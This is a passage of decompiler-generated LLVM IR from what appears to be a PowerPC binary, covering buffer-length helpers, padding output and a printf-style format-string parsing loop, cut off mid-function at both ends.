  uselistorder label %dec_label_pc_10005804, { 1, 0 }
  uselistorder label %dec_label_pc_100057d8, { 1, 0 }
  uselistorder label %dec_label_pc_100057ac, { 1, 0 }
}

define i32 @function_10005838() local_unnamed_addr {
dec_label_pc_10005838:
  %v0_10005840 = load i32, i32* @r31, align 4
  %v0_10005844 = load i32, i32* @r3, align 4
  %v1_1000584c = add i32 %v0_10005844, 8
  %v2_1000584c = inttoptr i32 %v1_1000584c to i32*
  %v3_1000584c = load i32, i32* %v2_1000584c, align 4
  %v1_10005850 = add i32 %v0_10005844, 16
  %v2_10005850 = inttoptr i32 %v1_10005850 to i32*
  %v3_10005850 = load i32, i32* %v2_10005850, align 4
  %v2_10005858 = sub i32 %v3_10005850, %v3_1000584c
  store i32 %v2_10005858, i32* @r5, align 4
  %v5_10005858 = icmp eq i32 %v2_10005858, 0
  br i1 %v5_10005858, label %dec_label_pc_10005868, label %dec_label_pc_10005860

dec_label_pc_10005860:                            ; preds = %dec_label_pc_10005838
  store i32 %v3_1000584c, i32* %v2_10005850, align 4
  store i32 268458088, i32* @lr, align 4
  %v2_10005864 = inttoptr i32 %v3_1000584c to i16*
  %v3_10005864 = call i32 @function_10009c70(i16* %v2_10005864, i32 %v2_10005858)
  %v0_10005868.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005868

dec_label_pc_10005868:                            ; preds = %dec_label_pc_10005838, %dec_label_pc_10005860
  %v0_10005868 = phi i32 [ %v0_10005844, %dec_label_pc_10005838 ], [ %v0_10005868.pre, %dec_label_pc_10005860 ]
  %v1_10005868 = add i32 %v0_10005868, 8
  %v2_10005868 = inttoptr i32 %v1_10005868 to i32*
  %v3_10005868 = load i32, i32* %v2_10005868, align 4
  %v1_1000586c = add i32 %v0_10005868, 16
  %v2_1000586c = inttoptr i32 %v1_1000586c to i32*
  %v3_1000586c = load i32, i32* %v2_1000586c, align 4
  store i32 %v0_10005840, i32* @r31, align 4
  %v2_10005874 = sub i32 %v3_1000586c, %v3_10005868
  ret i32 %v2_10005874

; uselistorder directives
  uselistorder i32 %v0_10005868, { 1, 0 }
  uselistorder i32 %v3_1000584c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005868, { 1, 0 }
}

define i32 @function_10005888(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005888:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100058b03 = icmp eq i32 %arg3, 0
  %v2_100058b4 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100058b03, label %dec_label_pc_100058d0, label %dec_label_pc_100058c4

dec_label_pc_100058ac:                            ; preds = %dec_label_pc_100058c4
  %v1_100058ac = add i32 %v0_100058ac, -1
  store i32 %v1_100058ac, i32* @r31, align 4
  %v3_100058b0 = icmp eq i32 %v1_100058ac, 0
  %v0_100058bc = load i32, i32* @r29, align 4
  br i1 %v3_100058b0, label %dec_label_pc_100058d0.loopexit, label %dec_label_pc_100058c4

dec_label_pc_100058c4:                            ; preds = %dec_label_pc_10005888, %dec_label_pc_100058ac
  %v0_100058bc5 = phi i32 [ %v0_100058bc, %dec_label_pc_100058ac ], [ %arg1, %dec_label_pc_10005888 ]
  store i32 268458184, i32* @lr, align 4
  %v3_100058c4 = inttoptr i32 %v0_100058bc5 to i16*
  %v4_100058c4 = call i32 @function_10009d50(i32 %v2_100058b4, i32 1, i16* %v3_100058c4)
  %v3_100058c8 = icmp eq i32 %v4_100058c4, 1
  %v0_100058ac = load i32, i32* @r31, align 4
  br i1 %v3_100058c8, label %dec_label_pc_100058ac, label %dec_label_pc_100058d0.loopexit

dec_label_pc_100058d0.loopexit:                   ; preds = %dec_label_pc_100058ac, %dec_label_pc_100058c4
  %v0_100058d4.ph = phi i32 [ %v0_100058ac, %dec_label_pc_100058c4 ], [ 0, %dec_label_pc_100058ac ]
  %v1_100058d4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100058d0

dec_label_pc_100058d0:                            ; preds = %dec_label_pc_100058d0.loopexit, %dec_label_pc_10005888
  %v1_100058d4 = phi i32 [ 0, %dec_label_pc_10005888 ], [ %v1_100058d4.pre, %dec_label_pc_100058d0.loopexit ]
  %v0_100058d4 = phi i32 [ 0, %dec_label_pc_10005888 ], [ %v0_100058d4.ph, %dec_label_pc_100058d0.loopexit ]
  %v2_100058d4 = sub i32 %v1_100058d4, %v0_100058d4
  ret i32 %v2_100058d4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100058d0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100058c4, { 1, 0 }
}

define i32 @function_100058e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100058e8:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v1_100058f4 = and i32 %arg2, 128
  %v3_100058f4 = icmp eq i32 %v1_100058f4, 0
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100058f4, label %dec_label_pc_1000594c, label %dec_label_pc_10005918

dec_label_pc_10005918:                            ; preds = %dec_label_pc_100058e8
  %v0_10005918 = call i32 @function_10007284()
  %v0_1000591c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005918, i32* @r31, align 4
  %v0_10005924 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005928 = load i32, i32* %r30.global-to-local, align 4
  %v2_10005928 = sub i32 %v1_10005928, %v0_10005918
  store i32 %v2_10005928, i32* %r29.global-to-local, align 4
  store i32 %v0_10005918, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10005928, 1
  br i1 %tmp7, label %dec_label_pc_1000594c, label %dec_label_pc_10005938

dec_label_pc_10005938:                            ; preds = %dec_label_pc_10005918
  %v1_1000591c = urem i32 %v0_1000591c, 128
  store i32 268458300, i32* @lr, align 4
  %v3_10005938 = trunc i32 %v1_1000591c to i8
  %v4_10005938 = call i32 @function_10005888(i32 %v0_10005924, i8 %v3_10005938, i32 %v2_10005928)
  %v0_1000593c = load i32, i32* @r31, align 4
  store i32 %v0_1000593c, i32* %r30.global-to-local, align 4
  %v1_10005940 = load i32, i32* @r29, align 4
  %v4_10005940 = icmp eq i32 %v4_10005938, %v1_10005940
  store i32 %v4_10005938, i32* @r28, align 4
  br i1 %v4_10005940, label %dec_label_pc_10005938.dec_label_pc_1000594c_crit_edge, label %dec_label_pc_10005970

dec_label_pc_10005938.dec_label_pc_1000594c_crit_edge: ; preds = %dec_label_pc_10005938
  %v0_10005958.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000594c

dec_label_pc_1000594c:                            ; preds = %dec_label_pc_10005938.dec_label_pc_1000594c_crit_edge, %dec_label_pc_10005918, %dec_label_pc_100058e8
  %v0_10005958 = phi i32 [ %v0_10005958.pre, %dec_label_pc_10005938.dec_label_pc_1000594c_crit_edge ], [ %v0_10005924, %dec_label_pc_10005918 ], [ %arg1, %dec_label_pc_100058e8 ]
  %v0_10005954 = phi i32 [ %v0_1000593c, %dec_label_pc_10005938.dec_label_pc_1000594c_crit_edge ], [ %v0_10005918, %dec_label_pc_10005918 ], [ %arg3, %dec_label_pc_100058e8 ]
  %tmp8 = icmp slt i32 %v0_10005954, 1
  br i1 %tmp8, label %dec_label_pc_1000596c, label %dec_label_pc_10005964

dec_label_pc_10005964:                            ; preds = %dec_label_pc_1000594c
  %v0_10005950 = load i32, i32* @r27, align 4
  store i32 268458344, i32* @lr, align 4
  %v3_10005964 = inttoptr i32 %v0_10005958 to i16*
  %v4_10005964 = call i32 @function_10009d50(i32 %v0_10005950, i32 %v0_10005954, i16* %v3_10005964)
  br label %dec_label_pc_1000596c

dec_label_pc_1000596c:                            ; preds = %dec_label_pc_1000594c, %dec_label_pc_10005964
  %v1_1000596c = phi i32 [ 0, %dec_label_pc_1000594c ], [ %v4_10005964, %dec_label_pc_10005964 ]
  %v0_1000596c = load i32, i32* @r28, align 4
  %v2_1000596c = add i32 %v0_1000596c, %v1_1000596c
  br label %dec_label_pc_10005970

dec_label_pc_10005970:                            ; preds = %dec_label_pc_10005938, %dec_label_pc_1000596c
  %v0_10005974 = phi i32 [ %v4_10005938, %dec_label_pc_10005938 ], [ %v2_1000596c, %dec_label_pc_1000596c ]
  ret i32 %v0_10005974

; uselistorder directives
  uselistorder i32 %v0_10005954, { 1, 0 }
  uselistorder i32 %v2_10005928, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10005970, { 1, 0 }
  uselistorder label %dec_label_pc_1000596c, { 1, 0 }
}

define i32 @function_10005988() local_unnamed_addr {
dec_label_pc_10005988:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000598c = load i32, i32* @lr, align 4
  store i32 %v0_1000598c, i32* %r0.global-to-local, align 4
  %v2_10005994 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10005994, i32* %r30.global-to-local, align 4
  %v0_10005998 = load i32, i32* @r3, align 4
  store i32 %v0_10005998, i32* %r24.global-to-local, align 4
  %v0_100059a4 = load i32, i32* @r5, align 4
  store i32 %v0_100059a4, i32* %r31.global-to-local, align 4
  %v0_100059a8 = load i32, i32* @r4, align 4
  store i32 %v0_100059a8, i32* @r29, align 4
  store i32 268458416, i32* @lr, align 4
  %v1_100059ac = bitcast i8** %stack_var_-200 to i32*
  %v2_100059ac = call i32 @function_10005ff0(i32* %v1_100059ac)
  %tmp72 = icmp sgt i32 %v2_100059ac, -1
  br i1 %tmp72, label %dec_label_pc_100059e0, label %dec_label_pc_100059b8

dec_label_pc_100059b8:                            ; preds = %dec_label_pc_10005988
  %v3_100059b8 = load i8*, i8** %stack_var_-200, align 4
  %v4_100059b8 = ptrtoint i8* %v3_100059b8 to i32
  store i32 %v4_100059b8, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100059b8, i32* @r3, align 4
  %v0_100059c4 = call i32 @function_10007284()
  %v3_100059c8 = icmp eq i32 %v0_100059c4, 0
  br i1 %v3_100059c8, label %dec_label_pc_10005fd8, label %dec_label_pc_100059d0

dec_label_pc_100059d0:                            ; preds = %dec_label_pc_100059b8
  %v0_100059d0 = load i32, i32* @r31, align 4
  %v0_100059d4 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100059dc.233 to i32), i32* @lr, align 4
  %v3_100059d8 = inttoptr i32 %v0_100059d4 to i16*
  %v4_100059d8 = call i32 @function_10009d50(i32 %v0_100059d0, i32 %v0_100059c4, i16* %v3_100059d8)
  br label %dec_label_pc_10005fd8

dec_label_pc_100059e0:                            ; preds = %dec_label_pc_10005988
  %v0_100059e4 = load i32, i32* @r31, align 4
  store i32 268458476, i32* @lr, align 4
  %v2_100059e8 = call i32 @function_100060ac(i32 %v2_10005994, i32 %v0_100059e4)
  store i32 0, i32* %r23.global-to-local, align 4
  %v2_10005a80 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10005a84 = zext i8 %tmp59 to i32
  %tmp73 = icmp slt i32 %tmp60, 1
  %v2_10005aa8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10005aac = icmp eq i32 %tmp58, 0
  %tmp74 = icmp sgt i32 %tmp58, -1
  %v3_10005ae0 = icmp eq i32 %tmp57, 0
  %v2_10005e38 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10005d58 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10005d5c = ptrtoint i32* %stack_var_-336 to i32
  %v5_10005bd0 = bitcast i32* %stack_var_-201 to i8*
  %tmp75 = icmp ult i32 %tmp57, 6
  %v3_10005cac = icmp eq i32 %tmp57, 1
  %v2_10005c50 = icmp ugt i32 %tmp57, 2
  %v4_10005b90 = zext i8 %tmp55 to i32
  %v0_10005fc4.pre = load i32, i32* @r29, align 4
  %v1_10005ab0 = add i32 %tmp58, 1
  %v2_10005b08 = icmp ugt i32 %tmp57, 7
  %v2_10005ce4 = icmp ugt i32 %tmp57, 15
  %v2_10005d18 = icmp ugt i32 %tmp57, 17
  %v3_10005d18 = icmp eq i32 %tmp57, 17
  %v2_10005dc0 = icmp ugt i32 %tmp57, 19
  %v3_10005dc0 = icmp eq i32 %tmp57, 19
  %v3_10005e2c = icmp eq i32 %tmp57, 20
  %v1_10005b20 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000e5ec.235 to i32), i32 -1)
  %v2_10005b20 = inttoptr i32 %v1_10005b20 to i8*
  %v3_10005c5c = icmp eq i32 %tmp57, 3
  %v3_10005c6c = icmp eq i32 %tmp57, 4
  %v1_10005a94 = mul nuw nsw i32 %v4_10005a84, 8
  %v2_10005a98 = add i32 %v2_10005a80, %v1_10005a94
  %v1_10005a9c = add i32 %v2_10005a98, -8
  br label %dec_label_pc_10005fc4

dec_label_pc_100059f8.backedge:                   ; preds = %dec_label_pc_10005a4c, %dec_label_pc_10005a04
  %storemerge12.in = phi i32 [ %v1_10005a14, %dec_label_pc_10005a04 ], [ %v1_10005a4c, %dec_label_pc_10005a4c ]
  %v1_10005a0c15 = phi i32 [ %v0_10005a24, %dec_label_pc_10005a04 ], [ %v1_10005a4c, %dec_label_pc_10005a4c ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_100059f8

dec_label_pc_100059f8:                            ; preds = %dec_label_pc_100059f8.backedge, %dec_label_pc_10005fc4
  %v0_10005a24 = phi i32 [ %v1_10005a0c15, %dec_label_pc_100059f8.backedge ], [ %v0_10005fc4, %dec_label_pc_10005fc4 ]
  %v1_10005a14 = phi i32 [ %storemerge12, %dec_label_pc_100059f8.backedge ], [ %v0_10005fc4, %dec_label_pc_10005fc4 ]
  %v1_100059f8 = inttoptr i32 %v1_10005a14 to i8*
  %v2_100059f8 = load i8, i8* %v1_100059f8, align 1
  %v3_100059f8 = zext i8 %v2_100059f8 to i32
  store i32 %v3_100059f8, i32* %r0.global-to-local, align 4
  %v3_100059fc = icmp eq i8 %v2_100059f8, 0
  br i1 %v3_100059fc, label %dec_label_pc_10005a0c, label %dec_label_pc_10005a04

dec_label_pc_10005a04:                            ; preds = %dec_label_pc_100059f8
  %v3_10005a04 = icmp eq i8 %v2_100059f8, 37
  br i1 %v3_10005a04, label %dec_label_pc_10005a0c, label %dec_label_pc_100059f8.backedge

dec_label_pc_10005a0c:                            ; preds = %dec_label_pc_10005a04, %dec_label_pc_100059f8
  %v4_10005a0c = icmp eq i32 %v1_10005a14, %v0_10005a24
  br i1 %v4_10005a0c, label %dec_label_pc_10005a40, label %dec_label_pc_10005a14

dec_label_pc_10005a14:                            ; preds = %dec_label_pc_10005a0c
  %v2_10005a14 = sub i32 %v1_10005a14, %v0_10005a24
  store i32 %v2_10005a14, i32* @r31, align 4
  %v4_10005a14 = icmp sgt i32 %v2_10005a14, 0
  br i1 %v4_10005a14, label %dec_label_pc_10005a24, label %dec_label_pc_10005a34

dec_label_pc_10005a24:                            ; preds = %dec_label_pc_10005a14
  %v0_10005a2c = load i32, i32* %r24.global-to-local, align 4
  store i32 268458548, i32* @lr, align 4
  %v3_10005a30 = inttoptr i32 %v0_10005a2c to i16*
  %v4_10005a30 = call i32 @function_10009d50(i32 %v0_10005a24, i32 %v2_10005a14, i16* %v3_10005a30)
  %v1_10005a34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005a34

dec_label_pc_10005a34:                            ; preds = %dec_label_pc_10005a14, %dec_label_pc_10005a24
  %v1_10005a3c = phi i32 [ %v1_10005a34.pre, %dec_label_pc_10005a24 ], [ %v2_10005a14, %dec_label_pc_10005a14 ]
  %storemerge = phi i32 [ %v4_10005a30, %dec_label_pc_10005a24 ], [ 0, %dec_label_pc_10005a14 ]
  %v4_10005a34 = icmp eq i32 %storemerge, %v1_10005a3c
  br i1 %v4_10005a34, label %dec_label_pc_10005a3c, label %dec_label_pc_10005fd4

dec_label_pc_10005a3c:                            ; preds = %dec_label_pc_10005a34
  %v0_10005a3c = load i32, i32* %r23.global-to-local, align 4
  %v2_10005a3c = add i32 %v0_10005a3c, %v1_10005a3c
  store i32 %v2_10005a3c, i32* %r23.global-to-local, align 4
  %v0_10005a40.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10005a40

dec_label_pc_10005a40:                            ; preds = %dec_label_pc_10005a0c, %dec_label_pc_10005a3c
  %v0_10005a4c = phi i32 [ %v0_10005a24, %dec_label_pc_10005a0c ], [ %v0_10005a40.pre, %dec_label_pc_10005a3c ]
  %v1_10005a40 = inttoptr i32 %v0_10005a4c to i8*
  %v2_10005a40 = load i8, i8* %v1_10005a40, align 1
  %v3_10005a40 = zext i8 %v2_10005a40 to i32
  store i32 %v3_10005a40, i32* %r0.global-to-local, align 4
  %v3_10005a44 = icmp eq i8 %v2_10005a40, 0
  br i1 %v3_10005a44, label %dec_label_pc_10005fd8, label %dec_label_pc_10005a4c

dec_label_pc_10005a4c:                            ; preds = %dec_label_pc_10005a40
  %v1_10005a4c = add i32 %v0_10005a4c, 1
  %v2_10005a4c = inttoptr i32 %v1_10005a4c to i8*
  %v3_10005a4c = load i8, i8* %v2_10005a4c, align 1
  %v4_10005a4c = zext i8 %v3_10005a4c to i32
  store i32 %v4_10005a4c, i32* %r0.global-to-local, align 4
  %v3_10005a54 = icmp eq i8 %v3_10005a4c, 37
  br i1 %v3_10005a54, label %dec_label_pc_100059f8.backedge, label %dec_label_pc_10005a5c

dec_label_pc_10005a5c:                            ; preds = %dec_label_pc_10005a4c
  store i32 %v2_10005994, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10005a4c, i8** %stack_var_-200, align 4
  store i32 268458612, i32* @lr, align 4
  %v3_10005a70 = call i32 @function_100063b8(i32* %v1_100059ac, i32 %v1_10005a4c)
  store i32 %v2_10005994, i32* @r3, align 4
  store i32 268458620, i32* @lr, align 4
  %v0_10005a78 = call i32 @function_10006108()
  store i32 %tmp60, i32* %r0.global-to-local, align 4
  store i32 %v2_10005a80, i32* %r11.global-to-local, align 4
  store i32 %v4_10005a84, i32* %r7.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_10005aa0, label %dec_label_pc_10005a94

dec_label_pc_10005a94:                            ; preds = %dec_label_pc_10005a5c
  br label %dec_label_pc_10005aa0

dec_label_pc_10005aa0:                            ; preds = %dec_label_pc_10005a5c, %dec_label_pc_10005a94
  %storemerge94 = phi i32 [ %v1_10005a9c, %dec_label_pc_10005a94 ], [ %v2_10005a80, %dec_label_pc_10005a5c ]
  %v0_10005acc83 = phi i32 [ %v1_10005a9c, %dec_label_pc_10005a94 ], [ %v2_10005a80, %dec_label_pc_10005a5c ]
  store i32 %storemerge94, i32* %r10.global-to-local, align 4
  store i32 %v2_10005aa8, i32* %r8.global-to-local, align 4
  store i32 %v1_10005ab0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10005ad0.preheader, label %dec_label_pc_10005ad0.preheader.thread

dec_label_pc_10005ad0.preheader.thread:           ; preds = %dec_label_pc_10005aa0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10005adc

dec_label_pc_10005ad0.preheader:                  ; preds = %dec_label_pc_10005aa0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10005aac, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.preheader

dec_label_pc_10005ac8.preheader:                  ; preds = %dec_label_pc_10005ad0.preheader
  store i32 %v0_10005acc83, i32* %stack_var_-344, align 4
  %v1_10005acc84 = add i32 %v0_10005acc83, 8
  store i32 %v1_10005acc84, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_10005ad889 = add i32 %tmp58, -1
  store i32 %v1_10005ad889, i32* %ctr.global-to-local, align 4
  %v2_10005ad890 = icmp eq i32 %v1_10005ad889, 0
  br i1 %v2_10005ad890, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge

dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge: ; preds = %dec_label_pc_10005ac8.preheader, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge
  %v1_10005ac8.pre = phi i32 [ %v1_10005ac8.pre.pre, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ %v2_10005aa8, %dec_label_pc_10005ac8.preheader ]
  %v1_10005ad092 = phi i32 [ %v1_10005ad0, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ 4, %dec_label_pc_10005ac8.preheader ]
  %v1_10005acc91 = phi i32 [ %v1_10005acc, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ %v1_10005acc84, %dec_label_pc_10005ac8.preheader ]
  %v3_10005ac8 = add i32 %v1_10005ac8.pre, %v1_10005ad092
  %v4_10005ac8 = inttoptr i32 %v3_10005ac8 to i32*
  store i32 %v1_10005acc91, i32* %v4_10005ac8, align 4
  %v0_10005acc = load i32, i32* %r10.global-to-local, align 4
  %v1_10005acc = add i32 %v0_10005acc, 8
  store i32 %v1_10005acc, i32* %r10.global-to-local, align 4
  %v0_10005ad0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005ad0 = mul i32 %v0_10005ad0, 4
  store i32 %v1_10005ad0, i32* %r0.global-to-local, align 4
  %v1_10005ad4 = add i32 %v0_10005ad0, 1
  store i32 %v1_10005ad4, i32* %r11.global-to-local, align 4
  %v0_10005ad8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005ad8 = add i32 %v0_10005ad8, -1
  store i32 %v1_10005ad8, i32* %ctr.global-to-local, align 4
  %v2_10005ad8 = icmp eq i32 %v1_10005ad8, 0
  br i1 %v2_10005ad8, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge

dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge: ; preds = %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge
  %v1_10005ac8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005ac8.preheader, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge, %dec_label_pc_10005ad0.preheader.thread, %dec_label_pc_10005ad0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_10005ae0, label %dec_label_pc_10005ae8, label %dec_label_pc_10005b08

dec_label_pc_10005ae8:                            ; preds = %dec_label_pc_10005adc
  %v0_10005aec = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10005aec, i32* @r6, align 4
  %tmp99 = icmp slt i32 %v0_10005aec, 0
  %v1_10005af4 = zext i1 %tmp99 to i32
  %v2_10005af4 = ashr i32 %v0_10005aec, 31
  %v3_10005af4 = and i32 %v2_10005af4, -2
  %v4_10005af4 = or i32 %v3_10005af4, %v1_10005af4
  store i32 %v4_10005af4, i32* @r5, align 4
  %v1_10005afc = call i32 @__asm_rlwinm(i32 %v0_10005c18, i32 0, i32 20, i32 23)
  store i32 %v1_10005afc, i32* @r4, align 4
  %v1_10005b00 = inttoptr i32 %v1_10005afc to i16*
  %v2_10005b00 = call i32 @function_1000a034(i16* %v1_10005b00)
  br label %dec_label_pc_10005fc0

dec_label_pc_10005b08:                            ; preds = %dec_label_pc_10005adc
  br i1 %v2_10005b08, label %dec_label_pc_10005ce4, label %dec_label_pc_10005b10

dec_label_pc_10005b10:                            ; preds = %dec_label_pc_10005b08
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10005b20 = load i8, i8* %v2_10005b20, align 1
  %v4_10005b20 = zext i8 %v3_10005b20 to i32
  store i32 %v4_10005b20, i32* %r30.global-to-local, align 4
  %v3_10005b24 = icmp eq i8 %v3_10005b20, 10
  br i1 %v3_10005b24, label %dec_label_pc_10005b2c, label %dec_label_pc_10005b50

dec_label_pc_10005b2c:                            ; preds = %dec_label_pc_10005b10
  store i32 %v0_10005c18, i32* %r0.global-to-local, align 4
  %v1_10005b30 = call i32 @__asm_rlwinm(i32 %v0_10005c18, i32 27, i32 31, i32 31)
  %v2_10005b34 = icmp ne i32 %v1_10005b30, 0
  %v1_10005b40 = and i32 %v0_10005c18, 64
  %v3_10005b40 = icmp eq i32 %v1_10005b40, 0
  %v1_10005b44 = select i1 %v2_10005b34, i32 44, i32 87
  store i32 %v1_10005b44, i32* %r31.global-to-local, align 4
  br i1 %v3_10005b40, label %dec_label_pc_10005b50, label %dec_label_pc_10005b4c

dec_label_pc_10005b4c:                            ; preds = %dec_label_pc_10005b2c
  %v1_10005b4c = or i32 %v1_10005b44, 128
  store i32 %v1_10005b4c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b50

dec_label_pc_10005b50:                            ; preds = %dec_label_pc_10005b10, %dec_label_pc_10005b2c, %dec_label_pc_10005b4c
  %v0_10005b50 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005b50 = icmp ugt i32 %v0_10005b50, 5
  br i1 %v2_10005b50, label %dec_label_pc_10005b78, label %dec_label_pc_10005b58

dec_label_pc_10005b58:                            ; preds = %dec_label_pc_10005b50
  %v3_10005b58 = icmp eq i32 %v0_10005b50, 3
  br i1 %v3_10005b58, label %dec_label_pc_10005b60, label %dec_label_pc_10005b68

dec_label_pc_10005b60:                            ; preds = %dec_label_pc_10005b58
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b7c

dec_label_pc_10005b68:                            ; preds = %dec_label_pc_10005b58
  %v3_10005b68 = icmp eq i32 %v0_10005b50, 1
  br i1 %v3_10005b68, label %dec_label_pc_10005b80, label %dec_label_pc_10005b7c

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b50
  %v0_10005b78 = load i32, i32* %r30.global-to-local, align 4
  %v1_10005b78 = sub i32 0, %v0_10005b78
  store i32 %v1_10005b78, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b7c

dec_label_pc_10005b7c:                            ; preds = %dec_label_pc_10005b68, %dec_label_pc_10005b60, %dec_label_pc_10005b78
  br label %dec_label_pc_10005b80

dec_label_pc_10005b80:                            ; preds = %dec_label_pc_10005b68, %dec_label_pc_10005b7c
  %storemerge2 = phi i32 [ 11, %dec_label_pc_10005b7c ], [ 6, %dec_label_pc_10005b68 ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_10005b80 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005b80, i32* %r0.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10005b80, -1
  br i1 %tmp76, label %dec_label_pc_10005b94, label %dec_label_pc_10005b90

dec_label_pc_10005b90:                            ; preds = %dec_label_pc_10005b80
  br label %dec_label_pc_10005b94

dec_label_pc_10005b94:                            ; preds = %dec_label_pc_10005b80, %dec_label_pc_10005b90
  %storemerge95 = phi i32 [ %v4_10005b90, %dec_label_pc_10005b90 ], [ 32, %dec_label_pc_10005b80 ]
  store i32 %storemerge95, i32* @r26, align 4
  %v3_10005b94 = icmp eq i32 %v0_10005b50, 1
  br i1 %v3_10005b94, label %dec_label_pc_10005bb0, label %dec_label_pc_10005ba0

dec_label_pc_10005ba0:                            ; preds = %dec_label_pc_10005b94
  %v0_10005ba0 = load i32, i32* %r7.global-to-local, align 4
